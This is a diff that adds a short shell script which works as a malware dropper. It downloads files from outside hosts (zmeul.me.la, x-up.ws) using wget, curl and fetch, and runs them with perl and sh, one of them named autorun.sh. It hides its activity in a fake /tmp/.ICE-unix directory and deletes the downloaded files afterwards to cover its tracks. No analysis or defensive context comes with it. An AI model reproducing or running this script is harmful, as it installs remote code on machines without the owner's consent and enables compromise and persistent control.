@@ -1,0 +1,24 @@
+#!/bin/sh
+cd /tmp
+wget zmeul.me.la/q.txt
+perl q.txt
+rm -rf q.txt
+rm -rf .ICE-unix;
+mkdir .ICE-unix;
+cd .ICE-unix;rm -rf .* *
+curl -o nets.hk.tgz http://x-up.ws/i/45f673782626.zip
+wget -O nets.hk.tgz http://x-up.ws/i/45f673782626.zip
+fetch -o nets.hk.tgz http://x-up.ws/i/45f673782626.zip
+tar -xvf nets.hk.tgz
+rm -rf nets.hk.tgz
+perl nets.hk.txt
+perl nets.hk.txt
+mv nets.hk.txt .ICE-unix
+rm -rf nets.hk.txt* *
+wget -O autorun.sh http://x-up.ws/i/0eb4208e6231.zip
+curl -o autorun.sh http://x-up.ws/i/0eb4208e6231.zip
+fetch -o autorun.sh http://x-up.ws/i/0eb4208e6231.zip
+chmod +x autorun.sh
+sh autorun.sh
+rm -fr autorun.sh
+
